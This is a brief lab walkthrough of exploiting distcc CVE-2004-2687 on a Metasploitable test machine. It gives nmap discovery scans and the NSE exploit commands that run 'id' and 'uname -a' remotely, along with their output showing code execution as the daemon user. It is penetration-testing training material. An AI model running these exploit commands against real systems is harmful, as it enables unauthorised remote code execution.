# distcc (Port 3632)

## Discovery

| Command | Description |
|---|---|
| `nmap 192.168.1.105 -A -p- -T5` | Scans all ports; excluding known vulnerabilities (FTP, SSH, Samba, etc.), an unrecognized service `3632/tcp distccd` is spotted |
| `nmap 192.168.1.105 -p 3632 -sV` | Detects distccd v1 (GNU 4.2.4), confirming the version |

## Attack

| Command | Description |
|---|---|
| `nmap -p 3632 192.168.1.105 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='id'"` | **VULNERABLE (Exploitable)** — CVE-2004-2687 confirmed, command executed: `uid=1(daemon) gid=1(daemon) groups=1(daemon)` |

## Verification

| Command | Description |
|---|---|
| `nmap -p 3632 192.168.1.105 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='uname -a'"` | Returns `Linux metasploitable 2.6.24-16-server ... 2008 i686 GNU/Linux`, confirming RCE again |

**Note:** The privilege obtained is not root, but `daemon` (a low-privileged service account) — this is an example of remote code execution (RCE), not full system takeover.
